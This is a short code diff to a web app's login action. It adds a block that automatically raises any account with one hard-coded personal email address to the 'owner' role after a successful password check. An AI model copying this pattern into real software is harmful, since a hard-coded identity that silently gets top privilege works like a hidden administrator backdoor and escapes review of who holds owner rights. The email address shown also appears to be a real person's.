@@ -229,6 +229,12 @@ export async function loginAction(formData: FormData) {
             throw new Error("Invalid credentials");
         }
 
+        // Grant owner status only after the designated account password is verified.
+        if (user.email.toLowerCase() === "mythicalhrg@gmail.com" && user.role !== "owner") {
+            user.role = "owner";
+            await user.save();
+        }
+
         // Reset failed login count only after the password has been verified.
         await resetDistributedRateLimit(accountRateKey);
         await resetDistributedRateLimit(loginRateKey);
